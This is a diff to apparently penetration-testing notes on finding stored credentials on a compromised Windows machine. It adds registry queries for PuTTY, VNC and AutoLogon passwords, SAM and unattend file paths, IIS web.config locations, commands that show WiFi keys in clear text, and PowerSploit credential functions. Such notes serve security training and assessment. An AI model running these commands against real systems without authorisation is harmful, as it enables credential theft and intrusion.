@@ -21,12 +21,34 @@ f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
 ```
 There is a PowerSploit Power Shell script that we can use to automate the password reveal [located here.](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
 ## More Possible Credential Files
+#### XML INI CONFIG Credentials
 ```
 C:> dir /s *pass* == *cred* == *vnc* == *.config*
 C:> findstr /si password *.xml *.ini *.txt
+```
+## Registry Searches for Credentials
+#### PuTTY
+```
+reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"
+```
+#### RealVNC
+```
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+```
+#### Windows AutoLogin
+```
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+```
+#### SNMP
+```
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+```
+#### Last-Ditch-Effort Registry Search
+```
 C:> reg query HKLM /f password /t REG_SZ /s
 C:> reg query HKCU /f password /t REG_SZ /s
 ```
+## SAM 
 We can check the following files for credentials
 ```
 %SYSTEMROOT%\repair\SAM
@@ -36,6 +58,7 @@ We can check the following files for credentials
 %SYSTEMROOT%\System32\config\SYSTEM
 %SYSTEMROOT%\System32\config\RegBack\system
 ```
+## Unattended
 Unattend XML Files may contain passwords also,
 ```
 C:\unattend.xml
@@ -44,9 +67,24 @@ C:\Windows\Panther\Unattend\Unattend.xml
 C:\Windows\system32\sysprep.inf
 C:\Windows\system32\sysprep\sysprep.xml
 ```
+## IIS Admin Credentials
+The following locations should be checked for plain-text adminstrator credentials for the IIS server.
+```
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+C:\inetpub\wwwroot\web.config
+```
 ## WiFi Passwords
 We might be able to reuse a WiFi password on a compromised system if we have view access to it.
 ```
 C:> netsh wlan show profile
 C:> netsh wlan show profile (SSID) key=clear
+```
+## Using PowerSploit
+```
+Get-UnattendedInstallFile
+Get-Webconfig
+Get-ApplicationHost
+Get-SiteListPassword
+Get-CachedGPPPassword
+Get-RegistryAutoLogon
 ```
